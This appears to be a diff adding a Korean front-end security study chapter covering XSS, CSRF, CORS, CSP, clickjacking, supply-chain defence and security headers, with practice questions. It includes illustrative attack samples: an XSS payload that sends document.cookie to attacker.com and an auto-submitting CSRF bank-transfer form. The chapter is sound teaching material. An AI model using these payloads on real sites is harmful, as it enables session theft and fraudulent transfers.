@@ -1,0 +1,537 @@
+
+> **목표**: **XSS, CSRF, CORS, CSP, Clickjacking, 의존성 보안** 을 이해하고, 각각의 공격 원리와 방어 수단을 정확히 설명할 수 있어야 한다. FE 개발자가 실무에서 가장 자주 부딪히는 보안 주제다.
+
+* * *
+
+## 0. 웹 보안의 전제 — 브라우저는 왜 특이한 환경인가
+
+### 0-1. 브라우저는 "적의 코드"를 실행한다
+
+생각해보면 기이한 모델이다. 사용자가 아무 URL이나 입력하면, 그 서버가 보내준 **남이 작성한 JavaScript를 내 컴퓨터에서 바로 실행**한다. 파일 다운로드도 아니고, 허락도 안 받고, 즉시.
+
+이 모델이 성립하는 건 브라우저가 **샌드박스(Sandbox)**이기 때문이다. JS는 하드디스크에 임의 파일을 쓰지 못하고, 다른 Origin의 쿠키를 읽지 못하고, 사용자 카메라에 임의 접근도 못 한다. 이 제약의 집합이 "브라우저 보안 모델"이다.
+
+### 0-2. 이 챕터에서 다루는 공격 큰 그림
+
+| 공격 | 누가 나쁜 짓을 하나 | 요약 |
+|------|-----------------|------|
+| **XSS** | 공격자가 **피해자 브라우저**에 코드 주입 | 스크립트 삽입 → 쿠키 탈취·행동 강제 |
+| **CSRF** | 공격자가 **피해자 이름으로 요청** | 로그인된 상태를 악용해 원치 않는 API 호출 |
+| **Clickjacking** | iframe으로 가짜 UI 덮기 | 사용자가 클릭했다고 생각한 게 다른 동작 |
+| **의존성 공격** | npm 패키지에 악성 코드 삽입 | 수천 앱이 감염됨 |
+
+방어의 큰 틀도 외워둔다.
+
+| 방어 | 핵심 아이디어 |
+|------|--------------|
+| **Same-Origin Policy** | 남의 Origin 건드리지 못하게 기본 차단 |
+| **CORS** | 필요할 때만 명시적으로 문 열어줌 |
+| **CSP** | 실행 가능한 스크립트 소스 화이트리스트 |
+| **HttpOnly + SameSite 쿠키** | JS 접근 차단 + CSRF 자동 방어 |
+| **입력 이스케이프** | XSS 원천 차단 |
+
+구체는 각 섹션에서.
+
+### 0-3. 사고 방식: "신뢰 경계(Trust Boundary)"
+
+보안은 **경계**를 의식하는 것이다.
+
+*   서버에서 들어온 데이터 → 사용자 HTML에 넣기 전 **이스케이프**
+*   사용자 입력 → 서버에서 처리 전 **검증**
+*   외부 API 응답 → 쓰기 전 **검증**
+
+**"신뢰할 수 없는 입력이 신뢰 경계를 넘어설 때마다 검증·이스케이프한다"**가 원칙이다. 이 감각이 곧 보안 감각이다.
+
+* * *
+
+## 1. 브라우저 보안 모델의 기본 — Same-Origin Policy
+
+**같은 Origin의 문서만 서로의 DOM·쿠키·저장소에 접근 가능**하다.
+
+Origin = `scheme` + `host` + `port`
+
+| URL A | URL B | 동일 Origin? |
+|-------|-------|------------|
+| `https://a.com/x` | `https://a.com/y` | ✅ |
+| `https://a.com` | `http://a.com` | ❌ (scheme) |
+| `https://a.com` | `https://api.a.com` | ❌ (host) |
+| `https://a.com:443` | `https://a.com:8443` | ❌ (port) |
+
+### 예외
+
+*   `<script src>`, `<img src>`, `<link href>`, `<iframe src>` 는 **로드**는 가능, **내용 읽기는 불가**.
+*   `postMessage` 로 iframe과 명시적 메시지 교환.
+*   CORS로 명시적 허용.
+
+* * *
+
+## 2. XSS (Cross-Site Scripting)
+
+**공격자가 삽입한 스크립트가 피해자의 브라우저에서 실행**된다.
+
+### 종류
+
+| 종류 | 설명 |
+|------|------|
+| **Stored** | 서버 DB에 저장된 악성 코드가 다른 사용자에게 렌더링 (게시판 댓글) |
+| **Reflected** | URL 파라미터가 그대로 반사됨 (`?q=<script>`) |
+| **DOM-based** | 서버 관여 없이 JS가 URL/입력을 DOM에 주입 |
+
+### 피해
+
+*   세션 탈취 (`document.cookie`)
+*   키로깅
+*   가짜 UI로 비밀번호 입력 유도
+*   CSRF 토큰 유출
+
+### 공격 예시
+
+```html
+<!-- 사용자 이름 출력 -->
+<div>안녕하세요, {{username}}!</div>
+
+<!-- username = "<script>fetch('https://attacker.com?c='+document.cookie)</script>" -->
+```
+
+서버가 이스케이프 없이 출력하면 스크립트가 실행됨.
+
+### 방어 1 — 자동 이스케이프 프레임워크 사용
+
+React, Vue, Angular는 **기본적으로 이스케이프** 한다.
+
+```jsx
+// 안전 — 자동 이스케이프
+<div>{userInput}</div>
+
+// 위험 — 원본 HTML 주입
+<div dangerouslySetInnerHTML={{ __html: userInput }} />
+```
+
+### 방어 2 — innerHTML 금지, textContent 사용
+
+```javascript
+// 나쁨
+el.innerHTML = userInput;
+
+// 좋음
+el.textContent = userInput;
+```
+
+### 방어 3 — DOMPurify로 HTML 허용 리스트 필터링
+
+```javascript
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(userInput);
+element.innerHTML = clean;
+```
+
+### 방어 4 — CSP (Content Security Policy)
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none';
+```
+
+*   **허용된 출처의 스크립트만 실행**. 인라인 스크립트도 기본 차단.
+*   XSS가 성공해도 외부 서버로 데이터 유출이 막힘.
+
+#### nonce 기반
+
+```html
+<script nonce="R4ND0M">...</script>
+```
+
+```http
+Content-Security-Policy: script-src 'nonce-R4ND0M'
+```
+
+*   서버가 매 요청마다 랜덤 nonce 생성 → 공격자는 예측 불가.
+
+### 방어 5 — HttpOnly 쿠키
+
+세션 쿠키를 `HttpOnly` 로 설정하면 XSS로 탈취 불가.
+
+### ⚠️ 실무 규칙
+
+1.  **절대 사용자 입력을 `innerHTML`, `document.write`, `eval`, `setTimeout("문자열")` 에 넣지 않는다.**
+2.  **`dangerouslySetInnerHTML` 은 반드시 DOMPurify 통과 후에만**.
+3.  **CSP는 모든 신규 프로젝트에 기본 적용**. Report-Only로 먼저 관측.
+
+* * *
+
+## 3. CSRF (Cross-Site Request Forgery)
+
+**피해자가 로그인된 상태에서 공격자의 사이트를 방문하면, 브라우저가 자동 전송하는 쿠키를 이용해 피해자 명의로 요청**이 나간다.
+
+### 공격 시나리오
+
+1.  피해자가 `bank.com` 로그인 → 세션 쿠키 생성
+2.  피해자가 `evil.com` 방문
+3.  `evil.com` 에 숨겨진 폼:
+
+    ```html
+    <form action="https://bank.com/transfer" method="POST">
+      <input name="to" value="attacker">
+      <input name="amount" value="1000000">
+    </form>
+    <script>document.forms[0].submit()</script>
+    ```
+
+4.  브라우저가 `bank.com` 의 쿠키를 자동 첨부 → 이체 실행
+
+### 방어 1 — SameSite 쿠키
+
+```http
+Set-Cookie: session=xyz; SameSite=Lax; Secure; HttpOnly
+```
+
+*   `Lax` (기본): 크로스 사이트 POST에 쿠키 미첨부
+*   `Strict`: 크로스 사이트 navigation조차 미첨부
+*   CSRF의 1차 방어선
+
+### 방어 2 — CSRF Token (Synchronizer Token Pattern)
+
+```
+[서버] 폼 렌더링 시 랜덤 토큰 생성 → 세션에 저장 + HTML에 hidden input으로 삽입
+[클라] 폼 submit 시 토큰 동봉
+[서버] 쿠키 세션에 저장된 토큰과 비교
+```
+
+공격자는 피해자의 토큰을 알 수 없음 (Same-Origin Policy가 읽기를 막음).
+
+### 방어 3 — Double Submit Cookie
+
+```
+[서버] Set-Cookie: csrf=R4ND0M
+[클라] 요청 시 csrf 값을 쿠키 + 헤더 둘 다로 전송
+[서버] 쿠키와 헤더의 값이 일치하는지 확인
+```
+
+공격자는 헤더를 설정할 수 없음 (크로스 사이트 JS는 임의 헤더 불가).
+
+### 방어 4 — Custom Header
+
+`X-Requested-With: XMLHttpRequest` 같은 커스텀 헤더는 Simple Request가 아니므로 preflight가 발생 → CORS가 막아준다.
+
+### ⚠️ 실무 규칙
+
+*   **GET은 절대 상태 변경에 쓰지 않는다** (RESTful 원칙 + CSRF 방어).
+*   **JWT를 Authorization 헤더로만 쓴다면 CSRF 영향 없음** — 쿠키처럼 자동 전송되지 않음.
+*   **SameSite + CSRF Token 이중 방어** 가 안전.
+
+* * *
+
+## 4. CORS (Cross-Origin Resource Sharing)
+
+**다른 Origin의 리소스를 fetch하려 할 때 서버가 명시적으로 허용하는 메커니즘**.
+
+SOP가 기본 막음 → CORS 헤더로 예외 허용.
+
+### Simple Request
+
+다음 조건 **모두** 충족 시 preflight 없이 바로 요청:
+
+*   메서드: `GET`, `HEAD`, `POST`
+*   헤더: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` 만 사용
+*   `Content-Type` 값: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 중 하나
+
+### Preflight Request
+
+위 조건 벗어나면 브라우저가 **실제 요청 전에 OPTIONS를 먼저** 보냄.
+
+```http
+OPTIONS /api/users HTTP/1.1
+Origin: https://frontend.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Content-Type, Authorization
+
+--- 응답 ---
+HTTP/1.1 204
+Access-Control-Allow-Origin: https://frontend.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400
+```
+
+### 주요 응답 헤더
+
+| 헤더 | 설명 |
+|------|------|
+| `Access-Control-Allow-Origin` | 허용 Origin. `*` 또는 구체 도메인 |
+| `Access-Control-Allow-Credentials` | `true` 면 쿠키/인증 헤더 포함 허용 |
+| `Access-Control-Allow-Methods` | 허용 HTTP 메서드 |
+| `Access-Control-Allow-Headers` | 허용 요청 헤더 |
+| `Access-Control-Expose-Headers` | JS가 읽을 수 있는 응답 헤더 |
+| `Access-Control-Max-Age` | preflight 캐시 시간(초) |
+
+### ⚠️ 함정
+
+1.  **`Allow-Origin: *` + `Allow-Credentials: true` 는 금지** — 스펙 위반, 브라우저가 거부.
+2.  **쿠키 포함 요청**은 `fetch(url, { credentials: 'include' })` 이 필수.
+3.  **CORS는 브라우저 보안** — curl, 서버 간 요청에는 적용 안 됨.
+4.  **CORS 에러 응답도 status 200일 수 있다** — 브라우저가 사후 차단.
+
+```javascript
+// 실전 — 쿠키 포함 크로스 Origin 요청
+await fetch('https://api.site.com/me', {
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' }
+});
+```
+
+* * *
+
+## 5. Clickjacking
+
+**투명 iframe을 피해자 페이지 위에 겹쳐 놓고, 피해자가 자기 UI를 클릭한다고 착각하는 사이 공격자 UI의 버튼을 클릭**하게 만듦.
+
+### 방어
+
+```http
+X-Frame-Options: DENY              # 어떤 iframe에도 임베드 금지
+X-Frame-Options: SAMEORIGIN        # 같은 Origin만 허용
+```
+
+최신 스펙:
+
+```http
+Content-Security-Policy: frame-ancestors 'self' https://trusted.com
+```
+
+* * *
+
+## 6. HTTPS·TLS 관련 (복습)
+
+(자세한 것은 2-2장 참조)
+
+*   **HSTS**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
+*   **Mixed Content**: HTTPS 페이지에서 HTTP 리소스 로드 → 차단
+*   **Upgrade-Insecure-Requests**: `Content-Security-Policy: upgrade-insecure-requests`
+
+* * *
+
+## 7. 의존성 보안 (Supply Chain)
+
+**Supply chain attack** — 외부 라이브러리를 통한 침투가 최근 가장 치명적.
+
+### 유명 사례
+
+*   **event-stream (2018)**: 인기 npm 패키지가 인수 후 비트코인 지갑 탈취 코드 삽입.
+*   **ua-parser-js (2021)**: 계정 탈취 → 악성 버전 배포.
+*   **node-ipc (2022)**: 러시아·벨라루스 IP 감지 시 파일 삭제 (정치적 목적).
+
+### 방어
+
+| 방법 | 도구 |
+|------|------|
+| 취약점 스캔 | `npm audit`, `yarn audit`, Snyk, Dependabot |
+| 락파일 고정 | `package-lock.json`, `yarn.lock` 커밋 필수 |
+| 버전 범위 축소 | `^1.2.3` 대신 `1.2.3` (exact) 고려 |
+| 서브리소스 무결성 | `<script integrity="sha384-...">` |
+| 패키지 검증 | npm signatures, `npm ci` |
+
+### SRI (Subresource Integrity)
+
+```html
+<script
+  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
+  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
+  crossorigin="anonymous">
+</script>
+```
+
+CDN이 변조되면 해시 불일치로 실행 안 됨.
+
+* * *
+
+## 8. OWASP Top 10 (2021) — FE 관점
+
+| 순위 | 위협 | FE 대응 |
+|------|------|---------|
+| A01 | Broken Access Control | 라우트 가드 + 서버 이중 체크 |
+| A02 | Cryptographic Failures | HTTPS, Secure 쿠키 |
+| A03 | Injection (SQLi, XSS) | 자동 이스케이프, CSP, DOMPurify |
+| A04 | Insecure Design | 위협 모델링 |
+| A05 | Security Misconfiguration | 보안 헤더 기본값 |
+| A06 | Vulnerable Components | `npm audit`, Dependabot |
+| A07 | Auth Failures | HttpOnly 쿠키, PKCE |
+| A08 | Software/Data Integrity | SRI, 락파일 |
+| A09 | Logging/Monitoring Failures | 에러 트래킹 (Sentry) |
+| A10 | SSRF | (주로 서버 이슈) |
+
+* * *
+
+## 9. 보안 헤더 세트 (실전 설정)
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; object-src 'none'; frame-ancestors 'self';
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Embedder-Policy: require-corp
+```
+
+### 각 헤더 효과
+
+| 헤더 | 막는 것 |
+|------|---------|
+| HSTS | HTTPS 다운그레이드, SSL stripping |
+| CSP | XSS (대부분), 리소스 유출 |
+| X-Content-Type-Options | MIME sniffing 공격 |
+| X-Frame-Options | Clickjacking |
+| Referrer-Policy | URL 파라미터 유출 |
+| Permissions-Policy | 남용될 수 있는 API 차단 |
+| COOP/COEP | Spectre 등 사이드 채널 |
+
+* * *
+
+## 10. Iframe 통신 보안 — postMessage
+
+```javascript
+// 보내는 쪽
+iframe.contentWindow.postMessage({ type: 'update' }, 'https://trusted.com');
+
+// 받는 쪽
+window.addEventListener('message', (e) => {
+  if (e.origin !== 'https://trusted.com') return; // ⚠️ origin 검증 필수
+  if (e.source !== expectedWindow) return;
+  handle(e.data);
+});
+```
+
+### ⚠️ 함정
+
+*   **`targetOrigin` 을 `*` 로 쓰지 않는다** — 아무 Origin에게나 전달됨.
+*   **수신 쪽에서 `origin` 검증 필수** — 검증 없으면 어떤 Origin이든 메시지 가능.
+
+* * *
+
+## 11. 개발 중 안전 확인 체크 (실전)
+
+### Chrome DevTools
+
+*   **Security 패널**: HTTPS 상태, 인증서
+*   **Application → Cookies**: HttpOnly, Secure, SameSite 확인
+*   **Network → Headers**: CSP, HSTS, CORS 헤더 확인
+*   **Console**: CSP 위반 리포트, Mixed Content 경고
+
+### Lighthouse
+
+*   Best Practices 항목에서 보안 경고 제공
+
+### 외부 스캐너
+
+*   [securityheaders.com](https://securityheaders.com)
+*   [SSL Labs](https://www.ssllabs.com/ssltest/)
+*   [Mozilla Observatory](https://observatory.mozilla.org)
+
+* * *
+
+## 12. 연습 문제
+
+**Q1.** XSS와 CSRF의 가장 본질적인 차이는?
+
+<details>
+<summary>정답</summary>
+
+*   **XSS**: 공격 스크립트가 **피해자의 브라우저에서 실행**됨. 공격 주체가 JS.
+*   **CSRF**: 피해자가 **자신도 모르게 요청을 보냄**. 공격 주체는 피해자의 브라우저(쿠키 자동 첨부).
+
+즉 XSS는 "내 페이지에 남의 코드가 실행", CSRF는 "남의 페이지에서 내 요청이 나감".
+
+</details>
+
+**Q2.** JWT를 `Authorization: Bearer` 헤더로 보내면 CSRF가 일어나지 않는 이유는?
+
+<details>
+<summary>정답</summary>
+
+CSRF는 브라우저가 자동 첨부하는 쿠키/기본 인증을 이용한다. `Authorization` 헤더는 JS가 명시적으로 설정해야 하므로 공격자의 크로스 사이트 폼/이미지로 자동 전송되지 않는다. 단, 이 경우 XSS로 토큰이 털릴 위험이 더 커진다.
+
+</details>
+
+**Q3.** `Access-Control-Allow-Origin: *` 와 `credentials: 'include'` 를 같이 쓰면 왜 안 되는가?
+
+<details>
+<summary>정답</summary>
+
+스펙상 금지. `*` 는 공용 리소스를 의미하는데 쿠키를 함께 보내면 사용자별 민감 정보가 임의 Origin으로 유출될 수 있다. 브라우저가 CORS 에러로 거부한다. 쿠키 포함 시에는 반드시 **구체적 Origin**을 지정해야 한다.
+
+</details>
+
+**Q4.** CSP를 적용했는데도 `<script>alert(1)</script>` 가 실행되는 XSS가 발견됐다. 왜일까?
+
+<details>
+<summary>정답</summary>
+
+가능한 원인:
+
+1.  `unsafe-inline` 을 `script-src` 에 허용한 경우
+2.  `unsafe-eval` 이 허용돼 있고 공격자가 `eval/new Function` 경로 이용
+3.  JSONP나 allow-listed CDN에 있는 취약 스크립트 악용
+4.  nonce가 예측 가능하거나 재사용됨
+5.  공격이 실제로는 DOM sink (innerHTML)이고 브라우저가 `<script>` 를 실행하지 않은 것처럼 보이지만 이벤트 핸들러(`<img onerror=...>`)는 실행됨
+
+</details>
+
+**Q5.** SameSite=Lax 쿠키를 쓰면 CSRF 토큰이 필요 없는가?
+
+<details>
+<summary>정답</summary>
+
+**충분하지 않다**. 이유:
+
+1.  구형 브라우저는 SameSite를 지원하지 않음
+2.  Lax는 GET navigation에 쿠키를 허용 → 사이드 이펙트 있는 GET API가 있으면 취약
+3.  같은 사이트 내 XSS 취약 페이지가 있으면 무력화
+4.  심층 방어(defense in depth) 원칙상 CSRF 토큰 이중 방어 권장
+
+</details>
+
+**Q6.** `dangerouslySetInnerHTML` 을 써야만 하는 상황에서 안전하게 쓰는 방법은?
+
+<details>
+<summary>정답</summary>
+
+1.  콘텐츠 소스를 **신뢰할 수 있는 곳**으로 제한 (서버에서 마크다운 렌더 + sanitize 후 내려받기)
+2.  클라이언트에서 렌더 시 **DOMPurify** 로 한 번 더 필터
+3.  CSP를 엄격히 설정해 인라인 스크립트 실행 자체를 차단
+4.  허용 태그 목록을 최소화 (a, p, strong, em, code 수준)
+
+</details>
+
+**Q7.** `npm audit` 에서 critical 취약점이 나왔다. 바로 업데이트하면 되는가?
+
+<details>
+<summary>정답</summary>
+
+반드시 그렇지 않다:
+
+1.  취약점이 **실제 실행 경로에 있는지** 확인 (devDependency라면 런타임 영향 없음)
+2.  주버전 업데이트는 **Breaking Change** 동반 → 테스트 필수
+3.  패치 패키지(`npm overrides`, `resolutions`) 로 간접 의존성만 잡을 수도 있음
+4.  취약점이 **DoS만** 이라면 우선순위 낮출 수 있음
+5.  긴급 조치 후 정식 테스트를 거쳐 배포
+
+</details>
+
+* * *
+
+## 13. 체크리스트
+
+*    Same-Origin Policy를 설명할 수 있다
+*    XSS 3종(Stored/Reflected/DOM)과 방어법을 안다
+*    CSRF 원리와 SameSite·CSRF 토큰 방어를 안다
+*    CORS의 Simple vs Preflight 조건을 안다
+*    `Allow-Origin: *` 와 `credentials` 의 조합 금지를 안다
+*    CSP로 XSS 피해를 제한할 수 있다
+*    `HttpOnly`, `Secure`, `SameSite` 쿠키를 바르게 설정할 수 있다
+*    `postMessage` 에서 origin 검증을 빠뜨리지 않는다
+*    `npm audit`, SRI로 공급망 공격을 방어한다
+*    필수 보안 헤더 세트를 외우고 있다
+
+* * *
+
+[← 2-7. 브라우저 저장소](2%EB%8B%A8%EA%B3%84-7-%EB%B8%8C%EB%9D%BC%EC%9A%B0%EC%A0%80-%EC%A0%80%EC%9E%A5%EC%86%8C) | [2-9. 캐싱과 CDN →](2%EB%8B%A8%EA%B3%84-9-%EC%BA%90%EC%8B%B1%EA%B3%BC-CDN)
